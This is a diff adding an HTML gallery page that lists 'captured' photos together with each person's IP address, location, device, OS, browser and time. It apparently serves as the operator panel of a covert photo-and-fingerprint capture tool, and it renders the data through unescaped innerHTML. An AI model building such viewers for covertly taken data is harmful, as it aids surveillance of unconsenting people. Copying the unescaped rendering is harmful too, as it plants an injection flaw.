@@ -1,0 +1,96 @@
+<!-- public/gallery.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Captured Data Gallery</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #f8f9fa;
+      margin: 0;
+      padding: 0;
+    }
+    h2 {
+      text-align: center;
+      margin-top: 32px;
+      color: #202124;
+      letter-spacing: 0.02em;
+    }
+    .gallery {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 28px;
+      padding: 36px 0;
+    }
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 12px rgba(60,64,67,.10);
+      width: 340px;
+      padding: 22px 18px 18px 18px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      transition: box-shadow 0.2s;
+    }
+    .card:hover {
+      box-shadow: 0 6px 24px rgba(60,64,67,.17);
+    }
+    .card img {
+      width: 220px;
+      border-radius: 8px;
+      margin-bottom: 16px;
+      box-shadow: 0 1px 6px rgba(60,64,67,.09);
+    }
+    .meta {
+      width: 100%;
+    }
+    .meta-row {
+      margin: 7px 0;
+      color: #333;
+      font-size: 1.03rem;
+      display: flex;
+      align-items: center;
+    }
+    .meta-label {
+      color: #888;
+      font-size: 0.97rem;
+      min-width: 88px;
+      display: inline-block;
+      margin-right: 8px;
+    }
+    @media (max-width: 700px) {
+      .gallery { gap: 16px; }
+      .card { width: 98vw; max-width: 340px; }
+      .card img { width: 90vw; max-width: 220px; }
+    }
+ </style>
+</head>
+<body>
+  <h2>Captured Photos & Device Info</h2>
+  <div class="gallery" id="gallery"></div>
+  <script>
+    fetch('/api/uploads')
+      .then(res => res.json())
+      .then(uploads => {
+        const gallery = document.getElementById('gallery');
+        gallery.innerHTML = uploads.reverse().map(u => `
+          <div class="card">
+            <img src="/uploads/${u.filename}" alt="Captured Photo">
+            <div class="meta">
+              <div class="meta-row"><span class="meta-label">IP:</span> ${u.ip}</div>
+              <div class="meta-row"><span class="meta-label">Location:</span> ${u.location?.city || '-'}, ${u.location?.country || '-'}</div>
+              <div class="meta-row"><span class="meta-label">Device:</span> ${u.device?.model || '-'} (${u.device?.type || '-'})</div>
+              <div class="meta-row"><span class="meta-label">OS:</span> ${u.device?.os?.name || '-'} ${u.device?.os?.version || ''}</div>
+              <div class="meta-row"><span class="meta-label">Browser:</span> ${u.device?.browser?.name || '-'} ${u.device?.browser?.version || ''}</div>
+              <div class="meta-row"><span class="meta-label">Time:</span> ${new Date(u.timestamp).toLocaleString()}</div>
+            </div>
+          </div>
+        `).join('');
+      });
+  </script>
+</body>
+</html>
